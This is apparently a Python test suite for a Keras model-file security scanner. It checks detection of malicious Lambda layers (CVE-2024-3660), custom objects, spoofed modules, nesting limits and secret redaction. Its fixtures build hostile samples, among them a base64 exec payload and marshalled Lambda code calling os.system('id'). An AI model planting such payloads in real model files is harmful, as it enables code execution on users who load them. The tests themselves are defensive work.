    def test_untrusted_qualified_nested_model_still_scans_nested_lambda(self, tmp_path: Path) -> None:
        """Custom model namespaces remain warned while model-shaped nested payloads are inspected."""
        encoded_code = base64.b64encode(b"exec('print(1)')").decode()
        model_class = "keras.src.engine.evil.Sequential"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": model_class,
                            "name": "custom_nested_model",
                            "config": {
                                "layers": [
                                    {
                                        "class_name": "Lambda",
                                        "name": "nested_lambda",
                                        "config": {"function": [encoded_code, None, None]},
                                    }
                                ]
                            },
                        }
                    ]
                },
            },
            keras_version="2.10.0",
            file_name="untrusted_qualified_nested_model.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert any(
            check.name == "Custom Layer Class Detection" and check.details.get("layer_class") == model_class
            for check in result.checks
        )
        assert any(
            issue.details.get("cve_id") == "CVE-2024-3660" and issue.details.get("layer_name") == "nested_lambda"
            for issue in result.issues
        )

    def test_wrapped_layer_config_missing_class_name_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """Wrapper-owned layer dictionaries require a class name for complete nested analysis."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "TimeDistributed",
                            "name": "broken_wrapper",
                            "config": {"layer": {"config": {"units": 1}}},
                        }
                    ]
                },
            },
            file_name="broken_wrapped_layer_structure.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_wrapped_layer_structure_invalid" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Wrapped Layer Structure Validation" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 2

    @pytest.mark.parametrize(
        ("wrapper_class", "config_key"),
        [
            ("TimeDistributed", "layer"),
            ("SpectralNormalization", "layer"),
            ("RNN", "cell"),
            ("StackedRNNCells", "cells"),
        ],
    )
    def test_required_wrapped_layer_null_fails_closed(
        self,
        tmp_path: Path,
        wrapper_class: str,
        config_key: str,
    ) -> None:
        """Required wrapper-owned nested layer values cannot be silently skipped."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": wrapper_class,
                            "name": "broken_wrapper",
                            "config": {config_key: None},
                        }
                    ]
                },
            },
            file_name=f"null_{wrapper_class}.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_wrapped_layer_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Wrapped Layer Type Validation"
            and check.status == CheckStatus.FAILED
            and check.details.get("config_key") == config_key
            and check.details.get("actual_type") == "NoneType"
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 2

    @pytest.mark.parametrize(
        ("wrapper_class", "config_key"),
        [
            ("TimeDistributed", "layer"),
            ("SpectralNormalization", "layer"),
            ("Bidirectional", "layer"),
            ("RNN", "cell"),
            ("StackedRNNCells", "cells"),
        ],
    )
    def test_required_wrapped_layer_config_missing_fails_closed(
        self,
        tmp_path: Path,
        wrapper_class: str,
        config_key: str,
    ) -> None:
        """Known wrappers missing required nested payloads make coverage incomplete."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": wrapper_class,
                            "name": "broken_wrapper",
                            "config": {},
                        }
                    ]
                },
            },
            file_name=f"missing_{wrapper_class}.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_wrapped_layer_required_config_missing" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Wrapped Layer Config Validation"
            and check.status == CheckStatus.FAILED
            and check.details.get("config_key") == config_key
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 2

    def test_wrapped_layer_validation_redacts_sensitive_layer_name(self, tmp_path: Path) -> None:
        raw_secret = "sk-proj-CAND061ZIPWRAPPERSECRET000000000000"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "TimeDistributed",
                            "name": f"wrapper_{raw_secret}",
                            "config": {},
                        }
                    ]
                },
            },
        )

        result = KerasZipScanner().scan(str(keras_path))
        wrapped_checks = [check for check in result.checks if check.name == "Wrapped Layer Config Validation"]

        assert len(wrapped_checks) == 1
        assert wrapped_checks[0].location and "wrapper_<redacted>" in wrapped_checks[0].location
        assert raw_secret not in result.to_json()

    @pytest.mark.parametrize("layer_class", ["Dense", "myproject.TimeDistributed"])
    def test_nonwrapper_layer_config_scalar_nested_names_remain_quiet(self, tmp_path: Path, layer_class: str) -> None:
        """Ordinary layer metadata named `layer`, `cell`, or `cells` must not be treated as nested layers."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": layer_class,
                            "name": "metadata_layer",
                            "config": {
                                "units": 1,
                                "layer": "encoder",
                                "cell": "relu",
                                "cells": ["left", "right"],
                            },
                        }
                    ]
                },
            },
            file_name="nonwrapper_nested_names.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert not any(check.name == "Wrapped Layer Type Validation" for check in result.checks)

    def test_nonwrapper_layer_config_dict_nested_names_remain_quiet(self, tmp_path: Path) -> None:
        """Known-safe non-wrapper layers may use nested-name dictionaries as ordinary metadata."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "metadata_layer",
                            "config": {
                                "units": 1,
                                "layer": {"class_name": "MetadataRecord", "config": {"value": "encoder"}},
                                "cell": {"class_name": "MetadataCell", "config": {"value": "relu"}},
                                "cells": [{"class_name": "MetadataCell", "config": {"value": "left"}}],
                            },
                        }
                    ]
                },
            },
            file_name="nonwrapper_nested_dict_names.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert not any(
            check.name == "Custom Layer Class Detection"
            and check.details.get("layer_class") in {"MetadataRecord", "MetadataCell"}
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 0

    def test_bidirectional_nullable_backward_layer_remains_quiet(self, tmp_path: Path) -> None:
        """A nullable optional Bidirectional backward layer must not make a valid config inconclusive."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Bidirectional",
                            "name": "bidirectional_wrapper",
                            "config": {
                                "layer": {
                                    "class_name": "LSTM",
                                    "name": "forward_lstm",
                                    "config": {"name": "forward_lstm"},
                                },
                                "backward_layer": None,
                            },
                        }
                    ]
                },
            },
            file_name="nullable_backward_layer.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
        assert not any(check.name == "Wrapped Layer Type Validation" for check in result.checks)

    def test_wrapped_layer_config_depth_budget_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """Excessive wrapper nesting must fail closed before exhausting the Python stack."""
        nested_layer: dict[str, Any] = {
            "class_name": "Dense",
            "name": "leaf",
            "config": {"units": 1},
        }
        for index in range(KerasZipScanner.MAX_NESTED_LAYER_DEPTH + 1):
            nested_layer = {
                "class_name": "TimeDistributed",
                "name": f"wrapper_{index}",
                "config": {"layer": nested_layer},
            }

        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {"layers": [nested_layer]},
            },
            file_name="deep_wrapped_layer.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_nested_layer_depth_exceeded" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Nested Layer Depth Validation"
            and check.status == CheckStatus.FAILED
            and check.details.get("max_nested_layer_depth") == KerasZipScanner.MAX_NESTED_LAYER_DEPTH
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 2
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_nested_layer_depth_exceeded",
            tmp_path / "nested-layer-depth-cache",
        )

    def test_wrapped_layer_config_depth_budget_preserves_security_exit1(self, tmp_path: Path) -> None:
        """A depth-limit outcome must not suppress an independently detected malicious Lambda."""
        nested_layer: dict[str, Any] = {
            "class_name": "Dense",
            "name": "leaf",
            "config": {"units": 1},
        }
        for index in range(KerasZipScanner.MAX_NESTED_LAYER_DEPTH + 1):
            nested_layer = {
                "class_name": "TimeDistributed",
                "name": f"wrapper_{index}",
                "config": {"layer": nested_layer},
            }

        encoded_code = base64.b64encode(b"exec('print(1)')").decode()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "name": "malicious_lambda",
                            "config": {"function": [encoded_code, None, None]},
                        },
                        nested_layer,
                    ]
                },
            },
            keras_version="2.10.0",
            file_name="deep_wrapped_layer_with_lambda.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_nested_layer_depth_exceeded" in result.metadata["scan_outcome_reasons"]
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert determine_exit_code(audit_result) == 1

    def test_wrapped_layer_list_item_budget_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized recurrent-cell lists must stop at a bounded item budget and fail closed."""
        monkeypatch.setattr(KerasZipScanner, "MAX_NESTED_LAYER_ITEMS", 2)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "StackedRNNCells",
                            "name": "oversized_cells",
                            "config": {
                                "cells": [
                                    {"class_name": "LSTMCell", "config": {}},
                                    {"class_name": "GRUCell", "config": {}},
                                    {"class_name": "SimpleRNNCell", "config": {}},
                                ]
                            },
                        }
                    ]
                },
            },
            file_name="oversized_wrapped_cells.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_nested_layer_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Nested Layer Item Limit"
            and check.status == CheckStatus.FAILED
            and check.details.get("actual_items") == 3
            and check.details.get("max_nested_layer_items") == 2
            for check in result.checks
        )
        assert determine_exit_code(audit_result) == 2
        _assert_inconclusive_keras_zip_scan_not_cached(
            keras_path,
            "keras_zip_nested_layer_item_limit_exceeded",
            tmp_path / "nested-layer-item-cache",
        )

    def test_wrapped_layer_item_budget_is_global_across_nested_lists(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Nested wrapper lists must share one traversal budget instead of multiplying it."""
        monkeypatch.setattr(KerasZipScanner, "MAX_NESTED_LAYER_ITEMS", 3)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "RNN",
                            "name": "outer_rnn",
                            "config": {
                                "cell": {
                                    "class_name": "StackedRNNCells",
                                    "name": "nested_cells",
                                    "config": {
                                        "cells": [
                                            {"class_name": "LSTMCell", "config": {}},
                                            {"class_name": "GRUCell", "config": {}},
                                            {"class_name": "SimpleRNNCell", "config": {}},
                                        ]
                                    },
                                }
                            },
                        }
                    ]
                },
            },
            file_name="global_nested_layer_budget.keras",
        )

        result = KerasZipScanner().scan(str(keras_path))
        audit_result = scan_model_directory_or_file(str(keras_path), config={"cache_scan_results": False})

        limit_check = next(check for check in result.checks if check.name == "Nested Layer Item Limit")
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_nested_layer_item_limit_exceeded" in result.metadata["scan_outcome_reasons"]
        assert limit_check.details["actual_items"] == 3
        assert limit_check.details["allowed_items"] == 2
        assert limit_check.details["items_scanned_before"] == 1
        assert determine_exit_code(audit_result) == 2

    def test_invalid_json_config(self, tmp_path: Path) -> None:
        """Test handling of invalid JSON in config."""
        scanner = KerasZipScanner()

        temp_path = tmp_path / "invalid_json.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            zf.writestr("config.json", "{ invalid json }")

        result = scanner.scan(str(temp_path))

        # Should handle invalid JSON gracefully
        assert not result.success
        json_error_found = False
        for check in result.checks:
            if "parse" in check.message.lower() and "json" in check.message.lower():
                json_error_found = True
                break

        assert json_error_found, "Should report JSON parsing error"

    def test_missing_config_json(self, tmp_path: Path) -> None:
        """Test handling of .keras file without config.json."""
        scanner = KerasZipScanner()

        temp_path = tmp_path / "missing_config.keras"
        with zipfile.ZipFile(temp_path, "w") as zf:
            # Only add metadata, no config
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

        result = scanner.scan(str(temp_path))

        # Should handle missing config.json
        missing_config_found = False
        for check in result.checks:
            if "config.json" in check.message:
                missing_config_found = True
                break

        assert missing_config_found, "Should report missing config.json"

    def test_detects_subclassed_model_in_zip(self, tmp_path):
        """Test that scanner detects subclassed models with custom class names."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "model.keras"

        with zipfile.ZipFile(keras_path, "w") as zf:
            config = {
                "class_name": "MyCustomTransformer",  # Subclassed model
                "config": {
                    "name": "custom_transformer",
                    "layers": [
                        {"class_name": "Dense", "config": {"units": 10}},
                    ],
                },
            }
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

        result = scanner.scan(str(keras_path))

        from modelaudit.scanners.base import CheckStatus

        subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
        assert len(subclass_checks) > 0
        assert subclass_checks[0].status != CheckStatus.PASSED
        assert subclass_checks[0].severity == IssueSeverity.INFO

    def test_compile_config_detects_custom_layer_loss_and_metric(self, tmp_path: Path) -> None:
        """ZIP scanner should inspect compile_config and custom layer classes."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "MaliciousLayer",
                        "name": "malicious_layer",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": "malicious_loss",
                "metrics": [{"class_name": "MaliciousMetric", "config": {"name": "malicious_metric"}}],
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="custom_objects.keras")))

        custom_layer_checks = [check for check in result.checks if check.name == "Custom Layer Class Detection"]
        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("layer_class") == "MaliciousLayer" for check in custom_layer_checks)
        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_keras_zip_details_redact_credentials_in_json_and_sarif(self, tmp_path: Path) -> None:
        direct_secret = "ZIP_DIRECT_SECRET"
        dict_secret = "ZIP_DICT_SECRET"
        lambda_layer_name_secret = "ZIP_LAMBDA_LAYER_NAME_SECRET"
        custom_secret = "ZIP_CUSTOM_SECRET"
        nested_secret = "ZIP_NESTED_SECRET"
        access_key_id_secret = "ZIP_ACCESS_KEY_ID_SECRET"
        camel_case_secret = "ZIP_CAMEL_CASE_SECRET"
        camel_case_key_secret = "ZIP_CAMEL_CASE_KEY_SECRET"
        camel_case_query_secret = "ZIP_CAMEL_CASE_QUERY_SECRET"
        authorization_secret = "ZIP_AUTHORIZATION_SECRET"
        proxy_authorization_secret = "ZIP_PROXY_AUTHORIZATION_SECRET"
        proxy_authorization_header_secret = "ZIP_PROXY_AUTHORIZATION_HEADER_SECRET"
        unterminated_authorization_secret = "ZIP_UNTERMINATED_AUTHORIZATION_SECRET"
        subscripted_authorization_secret = "ZIP_SUBSCRIPTED_AUTHORIZATION_SECRET"
        r_authorization_secret = "ZIP_R_AUTHORIZATION_SECRET"
        config_key_secret = "ZIP_CONFIG_KEY_SECRET"
        metric_secret = "ZIP_METRIC_SECRET"
        metric_identifier_secret = "ZIP_METRIC_IDENTIFIER_SECRET"
        loss_secret = "ZIP_LOSS_SECRET"
        custom_layer_class_secret = "ZIP_CUSTOM_LAYER_CLASS_SECRET"
        custom_layer_name_secret = "ZIP_CUSTOM_LAYER_NAME_SECRET"
        json_string_secret = "ZIP_JSON_STRING_SECRET"
        lambda_function_name_secret = "ZIP_LAMBDA_FUNCTION_NAME_SECRET"
        stringlookup_vocabulary_secret = "ZIP_STRINGLOOKUP_VOCABULARY_SECRET"
        keras_version_secret = "ZIP_KERAS_VERSION_SECRET"
        escaped_assignment_secret = "ZIP_ESCAPED_ASSIGNMENT_SECRET"
        json_container_secret = "ZIP_JSON_CONTAINER_SECRET"
        container_assignment_secret = "ZIP_CONTAINER_ASSIGNMENT_SECRET"
        malformed_lambda_config_secret = "ZIP_MALFORMED_LAMBDA_CONFIG_SECRET"
        model_class_secret = "ZIP_MODEL_CLASS_SECRET"

        def direct_lambda_code(x: Any) -> Any:
            token = "ZIP_DIRECT_SECRET"
            return (__import__("os").system("id"), token, x)[-1]

        def dict_lambda_code(x: Any) -> Any:
            token = "ZIP_DICT_SECRET"
            return (__import__("os").system("id"), token, x)[-1]

        config = {
            "class_name": f"token={model_class_secret}",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": f"token={lambda_layer_name_secret}",
                        "config": {
                            "function": [base64.b64encode(marshal.dumps(direct_lambda_code.__code__)).decode()],
                        },
                    },
                    {
                        "class_name": "Lambda",
                        "name": "dict_lambda",
                        "config": {
                            "function": {
                                "class_name": "__lambda__",
                                "config": {"code": base64.b64encode(marshal.dumps(dict_lambda_code.__code__)).decode()},
                            },
                        },
                    },
                    {
                        "class_name": "Lambda",
                        "name": "malformed_dict_lambda",
                        "config": {
                            "function": {
                                "class_name": "__lambda__",
                                "config": f"token={malformed_lambda_config_secret}",
                            },
                        },
                    },
                    {
                        "class_name": "SecretLayer",
                        "name": "secret_layer",
                        "config": {
                            "api_key": custom_secret,
                            "nested": {"token": nested_secret},
                            "aws_access_key_id": access_key_id_secret,
                            "awsSecretAccessKey": camel_case_secret,
                            f"awsSecretAccessKey={camel_case_key_secret}": "secret key should be redacted",
                            "source": (f"https://example.test/model.keras?clientSecret={camel_case_query_secret}&ok=1"),
                            "Authorization": f"Basic {authorization_secret}",
                            "proxyAuthorization": proxy_authorization_secret,
                            "proxyAuthorizationHeader": proxy_authorization_header_secret,
                            "unterminated_authorization": (f"proxyAuthorization='{unterminated_authorization_secret}"),
                            "subscripted_authorization": (
                                f'headers["proxyAuthorization"] = "{subscripted_authorization_secret}"'
                            ),
                            "r_authorization": f'headers$proxyAuthorization <- "{r_authorization_secret}"',
                            "metadata": f'{{"api_key":"{json_string_secret}","safe":"ok"}}',
                            "metadata_container": f'{{"api_key":["{json_container_secret}"],"safe":["ok"]}}',
                            "escaped_assignment": f"awsSecretAccessKey='abc\\'{escaped_assignment_secret}'",
                            "container_assignment": f'awsSecretAccessKey=["{container_assignment_secret}"]',
                            f"token={config_key_secret}": "secret key should be redacted",
                            "units": 4,
                        },
                    },
                    {
                        "class_name": f"token={custom_layer_class_secret}",
                        "name": f"token={custom_layer_name_secret}",
                        "config": {"units": 4},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "module_lambda",
                        "config": {
                            "module": "os",
                            "function_name": {"token": lambda_function_name_secret},
                        },
                    },
                    {
                        "class_name": "StringLookup",
                        "name": "lookup",
                        "config": {
                            "vocabulary": (
                                "https://user:"
                                f"{stringlookup_vocabulary_secret}@example.test/vocab.txt?token="
                                f"{stringlookup_vocabulary_secret}"
                            ),
                        },
                    },
                ]
            },
            "compile_config": {
                "metrics": [
                    {"class_name": "MaliciousMetric", "config": {"api_key": metric_secret}},
                    f"token={metric_identifier_secret}",
                ],
                "loss": {"class_name": "MaliciousLoss", "config": {"token": loss_secret}},
            },
        }
        raw_secrets = [
            direct_secret,
            dict_secret,
            lambda_layer_name_secret,
            custom_secret,
            nested_secret,
            access_key_id_secret,
            camel_case_secret,
            camel_case_key_secret,
            camel_case_query_secret,
            authorization_secret,
            proxy_authorization_secret,
            proxy_authorization_header_secret,
            unterminated_authorization_secret,
            subscripted_authorization_secret,
            r_authorization_secret,
            config_key_secret,
            metric_secret,
            metric_identifier_secret,
            loss_secret,
            custom_layer_class_secret,
            custom_layer_name_secret,
            json_string_secret,
            lambda_function_name_secret,
            stringlookup_vocabulary_secret,
            keras_version_secret,
            escaped_assignment_secret,
            json_container_secret,
            container_assignment_secret,
            malformed_lambda_config_secret,
            model_class_secret,
        ]

        model_path = create_configured_keras_zip(
            tmp_path,
            config,
            file_name="redacted_details.keras",
            keras_version=f"token={keras_version_secret}",
        )
        scanner_result = KerasZipScanner().scan(str(model_path))
        details_json = json.dumps([check.details for check in scanner_result.checks], default=str)
        assert all(secret not in details_json for secret in raw_secrets)
        assert "<redacted>" in details_json
        assert "opaque_bytecode_may_contain_sensitive_constants" in details_json

        audit_result = scan_model_directory_or_file(str(model_path))
        json_output = audit_result.model_dump_json(indent=2, exclude_none=True)
        sarif_output = format_sarif_output(audit_result, [str(model_path)])

        assert all(secret not in json_output for secret in raw_secrets)
        assert all(secret not in sarif_output for secret in raw_secrets)
        assert "<redacted>" in json_output
        assert "<redacted>" in sarif_output

    def test_non_string_layer_class_reports_invalid_type_without_abort(self, tmp_path: Path) -> None:
        """Malformed non-string class names should fail closed without crashing redaction."""
        class_secret = "ZIP_LAYER_CLASS_REPR_SECRET"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": {"api_key": [class_secret]},
                        "name": "structured_class",
                        "config": {},
                    }
                ]
            },
        }

        model_path = create_configured_keras_zip(tmp_path, config, file_name="structured_class.keras")
        result = KerasZipScanner().scan(str(model_path))

        assert not any(check.name == "Keras ZIP File Scan" for check in result.checks)
        type_checks = [check for check in result.checks if check.name == "Layer Class Type Validation"]
        assert any(check.severity == IssueSeverity.WARNING for check in type_checks)
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "keras_zip_layer_class_invalid_type" in result.metadata["scan_outcome_reasons"]
        assert "<invalid:dict>" in result.metadata["layer_counts"]
        assert class_secret not in json.dumps(result.metadata, default=str)
        assert class_secret not in json.dumps([check.details for check in result.checks], default=str)

        audit_result = scan_model_directory_or_file(str(model_path))
        assert determine_exit_code(audit_result) != 0
        assert class_secret not in audit_result.model_dump_json(exclude_none=True)

    def test_malformed_layer_identifiers_do_not_abort_redaction(self, tmp_path: Path) -> None:
        """Malformed names and Lambda module metadata should not crash evidence redaction."""
        deeply_nested_module: object = "os"
        for _ in range(150):
            deeply_nested_module = [deeply_nested_module]

        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "CustomRegisteredLayer",
                        "registered_name": "CustomRegisteredLayer",
                        "name": 123,
                        "config": {},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "malformed_module",
                        "config": {"module": ["os"], "function_name": "system"},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "malformed_dict_module",
                        "config": {"module": {"os": True}, "function_name": "system"},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "benign_cosine_module",
                        "config": {"module": ["cosine"], "function_name": "call"},
                    },
                    {
                        "class_name": "Lambda",
                        "name": "deeply_nested_module",
                        "config": {"module": deeply_nested_module, "function_name": "system"},
                    },
                ]
            },
        }

        result = KerasZipScanner().scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="malformed_identifiers.keras"))
        )

        assert not any(check.name == "Keras ZIP File Scan" for check in result.checks)
        lambda_module_checks = [check for check in result.checks if check.name == "Lambda Layer Module Reference Check"]
        assert len(lambda_module_checks) >= 2
        assert not any(check.details.get("layer_name") == "benign_cosine_module" for check in lambda_module_checks)

    def test_compile_config_detects_nested_metric_and_loss_mappings(self, tmp_path: Path) -> None:
        """Nested compile_config structures should not bypass custom-object detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "malicious_loss"},
                "metrics": [["accuracy", {"class_name": "MaliciousMetric", "config": {"name": "metric"}}]],
                "weighted_metrics": {"output_1": ["Precision", "WeightedBackdoorMetric"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="nested_compile.keras")))

        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert any(check.details.get("identifier") == "MaliciousMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "WeightedBackdoorMetric" for check in custom_metric_checks)
        assert any(check.details.get("identifier") == "malicious_loss" for check in custom_loss_checks)

    def test_compile_config_safe_aliases_and_builtin_layers_do_not_false_positive(self, tmp_path: Path) -> None:
        """Safe aliases and built-in preprocessing layers should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 32, 32, 3]},
                    },
                    {
                        "class_name": "RandomShear",
                        "name": "random_shear",
                        "config": {"factor": 0.1},
                    },
                    {
                        "class_name": "RandomColorJitter",
                        "name": "random_color_jitter",
                        "config": {"value_range": [0, 255], "brightness_factor": 0.1},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "mae", "output_2": "mse"},
                "metrics": [["accuracy", "AUC"], [{"class_name": "MeanSquaredError", "config": {}}]],
                "weighted_metrics": {"output_1": ["Precision", "Recall"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="safe_compile.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Metric Detection" for check in result.checks)
        assert all(check.name != "Custom Loss Detection" for check in result.checks)

    def test_compile_config_deduplicates_custom_object_identifiers_by_normalized_name(
        self,
        tmp_path: Path,
    ) -> None:
        """Repeated custom metric/loss aliases with case or spacing drift should only emit once."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 4},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": ["malicious_loss", " MALICIOUS_LOSS "]},
                "metrics": [
                    "MaliciousMetric",
                    " maliciousmetric ",
                    {"class_name": "MALICIOUSMETRIC", "config": {}},
                ],
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="dedupe_compile.keras")))

        custom_metric_checks = [check for check in result.checks if check.name == "Custom Metric Detection"]
        custom_loss_checks = [check for check in result.checks if check.name == "Custom Loss Detection"]

        assert [check.details.get("identifier") for check in custom_metric_checks] == ["MaliciousMetric"]
        assert [check.details.get("identifier") for check in custom_loss_checks] == ["malicious_loss"]

    def test_registered_builtin_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Built-in layers with registered_name metadata should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "add_1",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="builtin_registered.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_builtin_registered_name_with_non_allowlisted_module_is_flagged(self, tmp_path: Path) -> None:
        """Spoofed built-in registered names must not hide custom modules."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="spoofed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

